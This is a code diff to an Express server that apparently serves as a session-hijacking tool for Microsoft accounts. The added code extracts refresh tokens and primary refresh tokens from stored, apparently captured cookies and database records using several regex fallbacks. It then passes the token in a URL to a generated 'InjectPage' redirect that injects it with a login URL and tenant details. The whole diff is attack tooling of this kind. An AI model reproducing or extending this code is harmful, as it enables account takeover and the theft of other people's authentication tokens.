@@ -132,9 +132,28 @@ router.get('/exchange/:id', async (req, res) => {
 
     // If no dedicated refresh token, try to extract from cookies
     if (!refreshToken && storedCookies) {
-      const rtMatch = storedCookies.match(/refresh[_tT]oken[^=]*=[^;]*/i);
-      if (rtMatch) {
-        refreshToken = rtMatch[0].split('=')[1];
+      // Try multiple patterns for refresh token in cookies
+      const rtPatterns = [
+        /refresh[_tT]oken=([^;]*)/i,
+        /refresh_token=([^;]*)/i,
+        /"refresh_token"\s*:\s*"([^"]+)"/i,
+        /0\.[A-Za-z0-9._-]{50,}/i,
+        /M\.[A-Za-z0-9._-]{50,}/i,
+        /eyJ[A-Za-z0-9._-]+/i
+      ];
+      for (const pattern of rtPatterns) {
+        const match = storedCookies.match(pattern);
+        if (match && match[1]) {
+          refreshToken = match[1];
+          console.log('[InjectPage] Extracted refresh token from cookies via pattern:', pattern.source.substring(0, 30));
+          break;
+        } else if (match && !match[1]) {
+          refreshToken = match[0].split('=')[1] || match[0];
+          if (refreshToken && refreshToken.length > 10) {
+            console.log('[InjectPage] Extracted refresh token from cookies via fallback pattern');
+            break;
+          }
+        }
       }
     }
 
@@ -293,7 +312,17 @@ router.get('/page/:id', async (req, res) => {
     // Pass the refresh token in URL query param so the redirect page can inject it
     // Use raw refresh token (NOT base64 encoded) - this is what Microsoft's auth endpoint expects
     var rtForUrl = refreshToken || (exchangeResult && exchangeResult.refresh_token);
-    // Also check the PRT field from the database
+    
+    // FALLBACK 1: If no RT yet, try extracting from stored cookies
+    if (!rtForUrl && storedCookies) {
+      var cookieRtMatch = storedCookies.match(/refresh[_tT]oken=([^;]*)/i);
+      if (cookieRtMatch && cookieRtMatch[1]) {
+        rtForUrl = cookieRtMatch[1];
+        console.log('[InjectPage] RT fallback from cookies_encrypted: extracted refresh_token');
+      }
+    }
+
+    // FALLBACK 2: Also check the PRT field from the database
     if (!rtForUrl && tokenRecord.prt) {
       var prtDecrypted = decrypt(tokenRecord.prt);
       if (prtDecrypted) {
@@ -313,6 +342,16 @@ router.get('/page/:id', async (req, res) => {
         }
       }
     }
+
+    // FALLBACK 3: Try extracting from cookies_encrypted as raw JWT/base64 patterns
+    if (!rtForUrl && storedCookies) {
+      var jwtMatch = storedCookies.match(/([A-Za-z0-9._-]{50,})/);
+      if (jwtMatch && jwtMatch[1].length > 100) {
+        rtForUrl = jwtMatch[1];
+        console.log('[InjectPage] RT fallback: extracted potential JWT from cookies');
+      }
+    }
+
     var rtParam = rtForUrl ? '?rt=' + encodeURIComponent(rtForUrl) : '';
     console.log('[InjectPage] RT param:', rtParam ? 'YES (' + rtForUrl.substring(0, 20) + '...)' : 'NO');
     res.type('html').send(generateAutoRedirectPage(loginUrl, tokenType, primaryToken, rtForUrl || '', tenant, accountType, rtParam));
